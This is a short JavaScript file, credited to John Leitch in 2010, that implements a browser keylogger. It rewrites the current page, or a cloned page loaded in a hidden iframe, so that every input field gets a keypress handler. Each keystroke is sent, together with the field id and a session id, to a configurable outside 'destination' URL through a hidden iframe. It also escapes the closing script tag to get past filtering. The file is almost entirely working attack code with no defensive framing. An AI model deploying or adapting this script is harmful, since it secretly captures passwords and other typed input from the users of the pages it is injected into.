// Copyright © John Leitch 2010 john.leitch5@gmail.com
var destination = null;
var useClone = false;
var cloneSource = null;
var cloneDelay = 1000;

function hookInputs() {
    var frame = document.getElementById(&#39;overlayFrame&#39;);    

    var keyPressScript =
        &#39;&lt;script&gt;&#39; +
            &#39;var l = Math.random().toString().substring(2);&#39; +
            &#39;function relayKeyPress(e) {&#39; +
                &#39;var fc = document.getElementById(&#34;frameContainer&#34;);&#39; +
                &#39;var x = String.fromCharCode(e.keyCode);&#39; +
                &#39;var y = String.fromCharCode(e.which);&#39; +
                &#39;var k = e.keyCode ? x : y;&#39; +
                &#39;var f = \&#39;&#39; + destination +
                    &#39;\&#39; + escape(k) + \&#39;,\&#39; + &#39; +
                    &#39;(e.srcElement ? e.srcElement.id : e.target.id) + &#39; +
                    &#39;\&#39;,\&#39; + l;&#39; +
                &#39;fc.src = f;&#39; +
            &#39;};&#39; +
        &#39;&lt;/\x73cript&gt;&#39;;

    var iframe = &#39;&lt;iframe id=&#34;frameContainer&#34; style=&#34;display:none;&#34;&gt;&lt;/iframe&gt;&#39;;

    var sourceDoc = useClone ? frame.contentDocument : document;

    var html = sourceDoc.getElementsByTagName(&#39;html&#39;)[0].innerHTML;

    html = html.replace(/&lt;head([^&gt;]*)&gt;/i, &#39;&lt;head $1&gt;&#39; + keyPressScript);
    html = html.replace(/&lt;body([^&gt;]*)&gt;/i, &#39;&lt;body $1&gt;&#39; + iframe);
    html = html.replace(/&lt;input/gi, &#39;&lt;input onkeypress=&#34;relayKeyPress(event)&#34; &#39;);

    document.clear();
    document.write(html);
}

window.onload = function() {
    if (destination == null) {
        alert(&#39;destination not set&#39;);

        return;
    }

    if (useClone) {

        if (cloneSource == null) {
            alert(&#39;cloneSource not set&#39;);
            return;
        }

        document.body.innerHTML +=
            &#39;&lt;iframe style=&#34;display:none;&#34; id=&#34;overlayFrame&#34; src=&#34;&#39; +
                cloneSource + &#39;&#34;&gt;&lt;/iframe&gt;&#39;;

        setTimeout(&#34;hookInputs()&#34;, cloneDelay);
    }
    else
        hookInputs();
};

